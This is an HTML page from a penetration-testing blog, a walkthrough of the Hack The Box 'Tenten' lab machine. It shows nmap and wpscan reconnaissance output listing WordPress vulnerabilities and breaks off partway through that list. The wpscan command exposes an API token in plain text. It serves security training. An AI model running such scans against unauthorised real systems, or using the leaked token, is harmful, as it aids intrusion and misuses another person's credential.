@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Tenten - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Tenten"><a href="#Hack-The-Box-Tenten" class="headerlink" title="Hack The Box - Tenten"></a>Hack The Box - Tenten</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Tenten  is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. Its IP address is <code>10.10.10.10.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/tenten/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/tenten)<br> |<br> |-->{SFire129}#nmap -A -v 10.10.10.10
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 13:35 EDT
+ NSE: Loaded 151 scripts for scanning.
+ Completed Ping Scan at 13:35, 0.21s elapsed (1 total hosts)
+ Initiating Parallel DNS resolution of 1 host. at 13:35
+ Nmap scan report for 10.10.10.10
+ Host is up (0.18s latency).
+ Not shown: 998 filtered ports
+ PORT   STATE SERVICE VERSION
+ 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey:
+ |   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
+ |   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
+ |_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
+ 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+ |_http-generator: WordPress 4.7.3
+ | http-methods:
+ |_  Supported Methods: GET HEAD POST OPTIONS
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ |_http-title: Job Portal &#8211; Just another WordPress site
+ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+ Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
+ No exact OS matches for host (test conditions non-ideal).
+ Uptime guess: 0.792 days (since Mon May 18 18:36:18 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=259 (Good luck!)
+ IP ID Sequence Generation: All zeros
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ TRACEROUTE (using port 22/tcp)
+ HOP RTT       ADDRESS
+ 1   172.05 ms 10.10.14.1
+ 2   180.17 ms 10.10.10.10
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 13:36
+ Completed NSE at 13:36, 0.00s elapsed
+ Initiating NSE at 13:36
+ Completed NSE at 13:36, 0.00s elapsed
+ Initiating NSE at 13:36
+ Completed NSE at 13:36, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 35.23 seconds
+            Raw packets sent: 2087 (95.416KB) | Rcvd: 59 (30.336KB)
+ |-------(root@kali)-------|(~/HackTheBox/tenten)
+ |
+ |-->{SFire129}# )</figure></pre>
+
+<p> The nmap report open port 80 with Wordpress 4.7.3 version.<br>
+<p> The next step is look if the Wordpress version has known vulnerabilities, then launch <code>wpscan</code> for help to find it.
+<br>
+<p>1.) --url: Target<br>
+2.) --api-token: api from https://wpvulndb.com/<br>
+3.) --enumerate vp: Search vulnerabilities in  plugins.
+<br>
+
+ <pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/tenten)
+ |-->{SFire129}#wpscan --url http://10.10.10.10 --api-token EHsyN5IgNKNk7DsCsGNpqiVpBpf1g60 --enumerate vp
+ _______________________________________________________________
+          __          _______   _____
+          \ \        / /  __ \ / ____|
+           \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+             \  /\  /  | |     ____) | (__| (_| | | | |
+              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+ 
+          WordPress Security Scanner by the WPScan Team
+                          Version 3.8.1
+        Sponsored by Automattic - https://automattic.com/
+        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+ _______________________________________________________________
+ 
+ [+] URL: http://10.10.10.10/ [10.10.10.10]
+ [+] Started: Tue May 19 13:43:00 2020
+ 
+ Interesting Finding(s):
+ 
+ [+] Headers
+  | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+  | Found By: Headers (Passive Detection)
+  | Confidence: 100%
+ 
+ [+] XML-RPC seems to be enabled: http://10.10.10.10/xmlrpc.php
+  | Found By: Direct Access (Aggressive Detection)
+  | Confidence: 100%
+  | References:
+  |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+  |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+ 
+ [+] http://10.10.10.10/readme.html
+  | Found By: Direct Access (Aggressive Detection)
+  | Confidence: 100%
+ 
+ [+] The external WP-Cron seems to be enabled: http://10.10.10.10/wp-cron.php
+  | Found By: Direct Access (Aggressive Detection)
+  | Confidence: 60%
+  | References:
+  |  - https://www.iplocation.net/defend-wordpress-from-ddos
+  |  - https://github.com/wpscanteam/wpscan/issues/1299
+ 
+ [+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
+  | Found By: Rss Generator (Passive Detection)
+  |  - http://10.10.10.10/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
+  |  - http://10.10.10.10/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
+  |
+  | [!] 50 vulnerabilities identified:
+  |
+  | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8807
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
+  |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
+  |      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
+  |      - https://core.trac.wordpress.org/ticket/25239
+  |
+  | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
+  |     Fixed in: 4.7.5
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8815
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
+  |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
+  |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
+  |
+  | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
+  |     Fixed in: 4.7.5
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8816
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
+  |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
+  |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
+  |
+  | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks
+  |     Fixed in: 4.7.5
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8817
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
+  |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
+  |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
+  |
+  | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
+  |     Fixed in: 4.7.5
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8818
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
+  |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
+  |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
+  |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
+  |
+  | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
+  |     Fixed in: 4.7.5
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8819
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
+  |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
+  |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
+  |      - https://hackerone.com/reports/203515
+  |      - https://hackerone.com/reports/203515
+  |
+  | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
+  |     Fixed in: 4.7.5
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8820
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
+  |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
+  |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
+  |
+  | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
+  |     Fixed in: 4.7.6
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8905
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723
+  |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
+  |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
+  |
+  | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
+  |     Fixed in: 4.7.5
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8906
+  |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
+  |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
+  |      - https://wpvulndb.com/vulnerabilities/8905
+  |
+  | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
+  |     Fixed in: 4.7.6
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8910
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
+  |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+  |      - https://core.trac.wordpress.org/changeset/41398
+  |
+  | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
+  |     Fixed in: 4.7.6
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8911
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
+  |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+  |      - https://core.trac.wordpress.org/changeset/41457
+  |      - https://hackerone.com/reports/205481
+  |
+  | [!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer
+  |     Fixed in: 4.7.6
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8912
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
+  |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+  |      - https://core.trac.wordpress.org/changeset/41397
+  |
+  | [!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
+  |     Fixed in: 4.7.6
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8913
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
+  |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+  |      - https://core.trac.wordpress.org/changeset/41448
+  |
+  | [!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
+  |     Fixed in: 4.7.6
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8914
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
+  |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+  |      - https://core.trac.wordpress.org/changeset/41395
+  |      - https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
+  |
+  | [!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
+  |     Fixed in: 4.7.7
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8941
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
+  |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
+  |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
+  |      - https://twitter.com/ircmaxell/status/923662170092638208
+  |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
+  |
+  | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
+  |     Fixed in: 4.7.8
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8966
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
+  |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
+  |
+  | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
+  |     Fixed in: 4.7.8
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8967
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
+  |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
+  |
+  | [!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
+  |     Fixed in: 4.7.8
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8968
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
+  |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
+  |
+  | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
+  |     Fixed in: 4.7.8
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/8969
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
+  |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
+  |
+  | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
+  |     Fixed in: 4.7.9
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9006
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263
+  |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
+  |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
+  |      - https://core.trac.wordpress.org/ticket/42720
+  |
+  | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9021
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
+  |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
+  |      - https://github.com/quitten/doser.py
+  |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
+  |
+  | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
+  |     Fixed in: 4.7.10
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9053
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
+  |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
+  |
+  | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
+  |     Fixed in: 4.7.10
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9054
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
+  |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
+  |
+  | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
+  |     Fixed in: 4.7.10
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9055
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
+  |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+  |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
+  |
+  | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
+  |     Fixed in: 4.7.11
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9100
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
+  |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
+  |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
+  |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
+  |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
+  |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
+  |
+  | [!] Title: WordPress <= 5.0 - Authenticated File Delete
+  |     Fixed in: 4.7.12
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9169
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
+  |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+  |
+  | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
+  |     Fixed in: 4.7.12
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9170
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
+  |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+  |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
+  |
+  | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
+  |     Fixed in: 4.7.12
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9171
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
+  |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+  |
+  | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
+  |     Fixed in: 4.7.12
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9172
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
+  |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+  |
+  | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
+  |     Fixed in: 4.7.12
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9173
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
+  |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+  |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
+  |
+  | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
+  |     Fixed in: 4.7.12
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9174
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
+  |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+  |
+  | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
+  |     Fixed in: 4.7.12
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9175
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
+  |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+  |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
+  |
+  | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
+  |     Fixed in: 5.0.1
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9222
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
+  |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
+  |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
+  |
+  | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
+  |     Fixed in: 4.7.13
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9230
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
+  |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
+  |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
+  |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
+  |
+  | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
+  |     Fixed in: 4.7.14
+  |     References:
+  |      - https://wpvulndb.com/vulnerabilities/9867
+  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
